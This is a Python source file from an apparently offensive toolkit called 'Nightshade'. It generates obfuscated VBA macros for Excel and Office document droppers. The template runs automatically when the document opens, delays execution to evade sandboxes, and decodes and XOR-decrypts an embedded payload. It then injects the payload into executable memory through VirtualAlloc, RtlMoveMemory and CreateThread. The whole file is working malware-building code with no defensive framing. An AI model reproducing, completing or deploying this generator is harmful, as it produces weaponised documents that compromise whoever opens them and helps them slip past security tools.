"""
Nightshade VBA Macro Generator.
Generates obfuscated VBA with Win32 API calls for in-memory execution.
"""
from ..core.obfuscation import VBAObfuscator


class VBAPayloadFactory:
    """Generate VBA macros for Excel / Office document droppers."""

    def __init__(self, encrypted_payload_b64: str):
        self._payload = encrypted_payload_b64

    def generate(self) -> str:
        """Produce an obfuscated VBA macro that decrypts and injects the payload."""
        rv = VBAObfuscator.random_var

        # Pre-generate all variable names so we can reference them
        v = [rv() for _ in range(30)]
        (
            v1, v2, v3, v4, v5, v6, v7, v8, v9, v10,
            v11, v12, v13, v14, v15, v16, v17, v18, v19, v20,
            v21, v22, v23, v24, v25, v26, v27, v28, v29, v30,
        ) = v[:30]

        vba = f"""
Private Declare PtrSafe Function CreateThread Lib "kernel32" _
    (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
     ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, _
     ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" _
    (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
     ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" _
    (ByVal destAddr As LongPtr, ByVal sourceAddr As LongPtr, _
     ByVal length As Long) As Long

Private Declare PtrSafe Function Sleep Lib "kernel32" _
    (ByVal dwMilliseconds As Long) As Long

Sub Auto_Open()
    {v1} = Initialize
End Sub

Sub Workbook_Open()
    {v1} = Initialize
End Sub

Private Function Initialize() As Boolean
    On Error Resume Next
    Dim {v2} As String
    Dim {v3} As Byte()
    Dim {v4} As Byte()
    
    ' OPSEC delay
    {v5} = 3000 + (Rnd * 2000)
    Sleep {v5}
    
    {v2} = "{self._payload}"
    {v3} = Base64Decode({v2})
    {v4} = XORDecrypt({v3})
    
    If UBound({v4}) > 0 Then
        ExecuteInMemory {v4}
    End If
    
    Initialize = True
End Function

Private Function Base64Decode(ByVal {v6} As String) As Byte()
    Dim {v7} As Object
    Dim {v8} As Object
    Set {v7} = CreateObject("MSXML2.DOMDocument.6.0")
    Set {v8} = {v7}.createElement("tmp")
    {v8}.DataType = "bin.base64"
    {v8}.Text = {v6}
    Base64Decode = {v8}.nodeTypedValue
End Function

Private Function XORDecrypt(ByRef {v9}() As Byte) As Byte()
    Dim {v10} As Long
    Dim {v11} As Long
    Dim {v12} As Byte()
    
    Dim {v13} As Variant
    {v13} = Array(42, 137, 91, 23, 198, 55, 12, 78, 201, 34, 167, 89, 200, 11, 66, 254)
    {v11} = UBound({v13}) - LBound({v13}) + 1
    
    ReDim {v12}(UBound({v9}))
    For {v10} = 0 To UBound({v9})
        {v12}({v10}) = {v9}({v10}) Xor {v13}({v10} Mod {v11})
    Next {v10}
    
    XORDecrypt = {v12}
End Function

Private Sub ExecuteInMemory(ByRef {v14}() As Byte)
    Dim {v15} As LongPtr
    Dim {v16} As LongPtr
    Dim {v17} As Long
    
    {v15} = VirtualAlloc(0, UBound({v14}) + 1, &H1000, &H40)
    
    For {v17} = 0 To UBound({v14})
        RtlMoveMemory {v15} + {v17}, VarPtr({v14}({v17})), 1
    Next {v17}
    
    {v16} = CreateThread(0, 0, {v15}, 0, 0, 0)
    If {v16} <> 0 Then Sleep 5000
End Sub
"""
        return VBAObfuscator.obfuscate_vba(vba)
